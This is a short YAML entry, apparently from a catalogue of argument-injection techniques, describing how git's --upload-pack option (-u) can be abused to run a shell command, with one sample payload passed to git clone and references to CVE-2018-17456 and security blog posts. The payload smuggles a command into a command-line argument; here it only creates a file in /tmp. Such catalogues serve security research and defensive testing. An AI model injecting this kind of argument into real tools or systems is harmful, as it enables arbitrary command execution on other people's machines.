---
functions:
  command:
    - description: |
        The `--upload-pack` vector requires a positional argument in addition to
        the injected argument. If possible, use a colon in the positional argument
        to always trigger the command.
      code: |-
        git clone '-u$({touch,/tmp/foo})' ':x'
      references:
        - title: "CVE-2018-17456"
          url: https://0day.click/recipe/cve-2018-17456/
        - title: "Securing Developer Tools: Argument Injection in Visual Studio Code"
          url: https://www.sonarsource.com/blog/securing-developer-tools-argument-injection-in-vscode/
        - title: "Securing Developer Tools: Package Managers"
          url: https://www.sonarsource.com/blog/securing-developer-tools-package-managers/
---
